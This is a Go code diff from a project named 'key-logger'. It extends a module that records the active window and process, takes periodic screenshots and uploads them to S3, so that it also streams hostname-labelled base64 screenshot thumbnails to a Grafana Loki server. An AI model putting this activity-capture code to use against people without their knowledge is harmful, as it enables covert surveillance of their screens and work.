@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"image"
 	"image/jpeg"
+	"os"
 	"regexp"
 	"sync"
 	"sync/atomic"
@@ -15,8 +16,11 @@ import (
 
 	"github.com/go-kit/kit/log"
 	"github.com/go-kit/kit/log/level"
+	"github.com/go-logfmt/logfmt"
 	"github.com/gonutz/w32/v2"
+	"github.com/grafana/loki-client-go/loki"
 	"github.com/kbinani/screenshot"
+	prom "github.com/prometheus/common/model"
 	"golang.org/x/image/draw"
 
 	"key-logger/pkg/model"
@@ -48,6 +52,7 @@ func setProcessDpiAwarenessContext() bool {
 
 type Window struct {
 	logger           log.Logger
+	lokiClient       *loki.Client
 	idleTime         uint32
 	wmtx             sync.Mutex
 	activeProcess    string
@@ -57,13 +62,14 @@ type Window struct {
 	cleanRegex       *regexp.Regexp
 }
 
-func New(logger log.Logger, s3 *s3.S3) *Window {
+func New(logger log.Logger, s3 *s3.S3, lokiClient *loki.Client) *Window {
 	reg, err := regexp.Compile("[^a-zA-Z0-9]+")
 	if err != nil {
 		panic(err)
 	}
 	w := &Window{
 		logger:     logger,
+		lokiClient: lokiClient,
 		s3:         s3,
 		cleanRegex: reg,
 	}
@@ -149,6 +155,19 @@ func (w *Window) getLastInputInfoLoop() {
 func (w *Window) logLastInputInfoLoop() {
 	sendInterval := 5 * time.Second
 	idleTime := 5 * time.Minute
+	jpegBuff := &bytes.Buffer{}
+	lineBuff := &bytes.Buffer{}
+	logfmtEncoder := logfmt.NewEncoder(lineBuff)
+	host, err := os.Hostname()
+	if err != nil {
+		level.Error(w.logger).Log("msg", "could not get hostname", "err", err)
+	}
+	labels := prom.LabelSet{
+		"host":      prom.LabelValue(host),
+		"job":       "screencap",
+		"thumbnail": "true",
+	}
+
 	for {
 		idle := atomic.LoadUint32(&w.idleTime)
 		start := time.Now()
@@ -171,11 +190,18 @@ func (w *Window) logLastInputInfoLoop() {
 
 				dst := image.NewRGBA(image.Rect(0, 0, 640, 360))
 				draw.CatmullRom.Scale(dst, dst.Rect, img, img.Bounds(), draw.Over, nil)
-				buf := &bytes.Buffer{}
-				jpeg.Encode(buf, dst, &EightyFivePercent)
-				b64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
+				jpegBuff.Reset()
+				jpeg.Encode(jpegBuff, dst, &EightyFivePercent)
+				b64Str := base64.StdEncoding.EncodeToString(jpegBuff.Bytes())
 				imageLoc := fmt.Sprintf("%s/%s/%s", w.s3.GetEndpoint(), w.s3.GetBucket(), im.Location)
-				level.Info(w.logger).Log("ts", time.Now(), "type", "screen-cap", "loc", imageLoc, "thumb", b64Str)
+				ts := time.Now()
+				if w.lokiClient != nil {
+					lineBuff.Reset()
+					logfmtEncoder.Reset()
+					logfmtEncoder.EncodeKeyvals("ts", ts, "type", "screen-cap", "loc", imageLoc, "thumb", b64Str)
+					w.lokiClient.Handle(labels, ts, lineBuff.String())
+				}
+				level.Info(w.logger).Log("ts", ts, "type", "screen-cap", "loc", imageLoc)
 			}
 			level.Info(w.logger).Log("ts", time.Now(), "type", "active-window", "window", win, "process", proc)
 		}
